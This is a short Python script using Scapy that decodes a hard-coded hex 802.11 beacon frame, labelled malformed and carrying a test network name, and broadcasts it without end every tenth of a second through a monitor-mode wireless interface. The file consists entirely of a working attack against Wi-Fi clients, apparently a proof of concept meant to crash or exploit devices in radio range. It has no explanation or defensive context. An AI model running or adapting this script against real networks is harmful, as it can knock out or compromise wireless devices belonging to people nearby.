from scapy.all import *
from time import sleep

malformed_beacon = '000008000000000080000000ffffffffffff28c63fa8afc528c63fa8afc50000a9db350000000000640011000008544553545f4b5241010882848b960c12182403010930140100000fac020100000fac023874000fac0108ed'
malformed_beacon = malformed_beacon.decode('hex')

while True:
    sendp(malformed_beacon, iface='wlan1mon') 
    sleep(0.1)
